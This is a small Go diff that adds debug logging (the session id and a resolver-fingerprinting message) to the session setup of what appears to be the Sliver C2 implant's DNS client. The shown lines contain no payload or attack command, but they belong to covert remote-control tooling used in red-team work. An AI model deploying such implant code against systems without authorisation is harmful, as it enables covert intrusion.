@@ -303,6 +303,13 @@ func (s *SliverDNSClient) SessionInit() error {
 	if err != nil {
 		return err
 	}
+	// {{if .Config.Debug}}
+	log.Printf("[dns] dns session id %d", s.dnsSessionID)
+	// {{end}}
+
+	// {{if .Config.Debug}}
+	log.Printf("[dns] fingerprinting resolvers ...")
+	// {{end}}
 	s.fingerprintResolvers() // Fingerprint the resolvers
 	if len(s.resolvers) < 1 {
 		// {{if .Config.Debug}}
